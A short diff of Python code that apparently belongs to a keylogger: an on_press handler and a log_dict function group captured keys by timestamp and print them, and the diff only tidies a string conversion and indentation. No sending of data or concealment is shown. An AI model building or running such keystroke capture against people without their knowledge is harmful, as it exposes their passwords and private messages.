@@ -19,7 +19,7 @@ def on_press(key):
 def log_dict(keys):
     global log_dict
     ct = datetime.datetime.now()
-    now = str(ct.strftime("%d-%m-%y %H:%M "))
+    now = ct.strftime("%d-%m-%y %H:%M ")
 
     data_str = ''
     for key in keys:
@@ -37,7 +37,7 @@ def log_dict(keys):
         else:
              continue
     if now in log_dict:
-            log_dict[now] += data_str
+        log_dict[now] += data_str
     else:
         log_dict[now] = data_str
         print(log_dict)
